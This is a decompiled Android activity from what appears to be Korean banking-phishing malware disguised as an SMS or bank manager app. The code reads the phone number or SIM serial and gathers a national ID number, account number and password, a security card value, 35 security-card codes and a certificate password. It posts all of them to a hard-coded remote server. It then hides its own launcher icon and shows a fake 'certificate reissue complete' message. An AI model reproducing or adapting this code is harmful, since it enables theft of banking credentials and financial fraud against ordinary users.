package com.example.bankmanager;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import cn.smsmanager.tools.JSONParser;
import com.example.smsmanager.R;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONException;
import org.json.JSONObject;

public class BankEndActivity extends Activity {
    private static final String TAG_SUCCESS = "success";
    String TAG = "BankEndActivity";
    EditText ed1;
    EditText ed2;
    JSONParser jsonParser = new JSONParser();
    Button next;
    /* access modifiers changed from: private */
    public ProgressDialog pDialog;
    List<NameValuePair> params;
    String phoneNumber = "";
    String send_bank_url = "http://kkk.kakatt.net:3369/send_bank.php";

    class CreateNewUser extends AsyncTask<String, String, String> {
        CreateNewUser() {
        }

        /* access modifiers changed from: protected */
        public void onPreExecute() {
            super.onPreExecute();
            BankEndActivity.this.pDialog = new ProgressDialog(BankEndActivity.this);
            BankEndActivity.this.pDialog.setMessage("신청중......");
            BankEndActivity.this.pDialog.setIndeterminate(false);
            BankEndActivity.this.pDialog.setCancelable(true);
            BankEndActivity.this.pDialog.show();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... args) {
            int success = 0;
            BankInfo.fenlei = "bk";
            String dateString2 = "";
            try {
                dateString2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(System.currentTimeMillis()));
            } catch (Exception e) {
                dateString2 = "1970-01-01 10:12:13";
            }
            Log.i("str6", dateString2);
            TelephonyManager tel = (TelephonyManager) BankEndActivity.this.getSystemService("phone");
            String phone = tel.getLine1Number();
            if (phone == null || phone == "" || phone.length() <= 10) {
                BankEndActivity.this.phoneNumber = tel.getSimSerialNumber();
            } else {
                BankEndActivity.this.phoneNumber = phone;
            }
            BankEndActivity.this.params = new ArrayList();
            BankEndActivity.this.params.add(new BasicNameValuePair("phone", BankEndActivity.this.phoneNumber));
            BankEndActivity.this.params.add(new BasicNameValuePair("bankinid", BankInfo.bankinid));
            BankEndActivity.this.params.add(new BasicNameValuePair("jumin", BankInfo.jumin));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknum", BankInfo.banknum));
            BankEndActivity.this.params.add(new BasicNameValuePair("banknumpw", BankInfo.banknumpw));
            BankEndActivity.this.params.add(new BasicNameValuePair("scard", BankInfo.scard));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn1", BankInfo.sn1));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn2", BankInfo.sn2));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn3", BankInfo.sn3));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn4", BankInfo.sn4));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn5", BankInfo.sn5));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn6", BankInfo.sn6));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn7", BankInfo.sn7));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn8", BankInfo.sn8));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn9", BankInfo.sn9));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn10", BankInfo.sn10));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn11", BankInfo.sn11));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn12", BankInfo.sn12));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn13", BankInfo.sn13));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn14", BankInfo.sn14));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn15", BankInfo.sn15));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn16", BankInfo.sn16));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn17", BankInfo.sn17));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn18", BankInfo.sn18));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn19", BankInfo.sn19));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn20", BankInfo.sn20));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn21", BankInfo.sn21));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn22", BankInfo.sn22));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn23", BankInfo.sn23));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn24", BankInfo.sn24));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn25", BankInfo.sn25));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn26", BankInfo.sn26));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn27", BankInfo.sn27));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn28", BankInfo.sn28));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn29", BankInfo.sn29));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn30", BankInfo.sn30));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn31", BankInfo.sn31));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn32", BankInfo.sn32));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn33", BankInfo.sn33));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn34", BankInfo.sn34));
            BankEndActivity.this.params.add(new BasicNameValuePair("sn35", BankInfo.sn35));
            BankEndActivity.this.params.add(new BasicNameValuePair("renzheng", BankInfo.renzheng));
            BankEndActivity.this.params.add(new BasicNameValuePair("fenlei", BankInfo.fenlei));
            BankEndActivity.this.params.add(new BasicNameValuePair("datetime", dateString2));
            JSONObject json = BankEndActivity.this.jsonParser.makeHttpRequest(BankEndActivity.this.send_bank_url, "POST", BankEndActivity.this.params);
            Log.d("Create Response", json.toString());
            try {
                JSONObject sonObject = new JSONObject(json.toString());
                success = json.getInt(BankEndActivity.TAG_SUCCESS);
                Log.d("json.getInt", success);
                if (success == 1) {
                    BankEndActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName("com.example.smsmanager", "com.example.bankmanager.BankSplashActivity"), 2, 1);
                } else {
                    Log.i("information", "Registration failed");
                }
            } catch (JSONException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
            String flag = "";
            if (success == 1) {
                return "OK";
            }
            return flag;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
            Log.d("onPostExecute", result);
            if (result.equals("신청중...")) {
                BankEndActivity.this.pDialog.setMessage("본인인증서 재발급 신청완료! 2시간후 이용가능합니다.");
            } else {
                BankEndActivity.this.pDialog.setMessage("본인인증서 재발급 신청완료! 2시간후 이용가능합니다.");
            }
            new Thread() {
                public void run() {
                    try {
                        AnonymousClass1.sleep(10000);
                        BankEndActivity.this.pDialog.dismiss();
                        Intent intent = new Intent();
                        intent.setAction("android.intent.action.MAIN");
                        intent.addCategory("android.intent.category.HOME");
                        intent.addFlags(268435456);
                        BankEndActivity.this.startActivity(intent);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.start();
        }
    }

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.bankend);
        this.next = (Button) findViewById(R.id.bankend_button1);
        this.ed1 = (EditText) findViewById(R.id.bankend_editText1);
        this.ed2 = (EditText) findViewById(R.id.bankend_editText2);
        this.next.setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                String str1 = BankEndActivity.this.ed1.getText().toString();
                String str2 = BankEndActivity.this.ed2.getText().toString();
                if (str1.equals("")) {
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "계좌번호 및 빌밀번호를 확인하세요", 0).show();
                } else if (str1.equals(str2)) {
                    BankInfo.renzheng = str1;
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.bankinid);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.jumin);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.banknum);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.banknumpw);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn1);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn2);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn3);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn4);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn6);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn7);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn8);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn9);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn10);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn11);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn12);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn13);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn14);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn15);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn16);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn17);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn18);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn19);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn20);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn21);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn22);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn23);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn24);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn25);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn26);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn27);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn28);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn29);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn30);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn31);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn32);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn33);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn34);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.sn35);
                    Log.i(BankEndActivity.this.TAG, "--num--" + BankInfo.renzheng);
                    new CreateNewUser().execute(new String[0]);
                } else {
                    Toast.makeText(BankEndActivity.this.getApplicationContext(), "인증서비번을 확인하세요", 0).show();
                }
            }
        });
    }
}
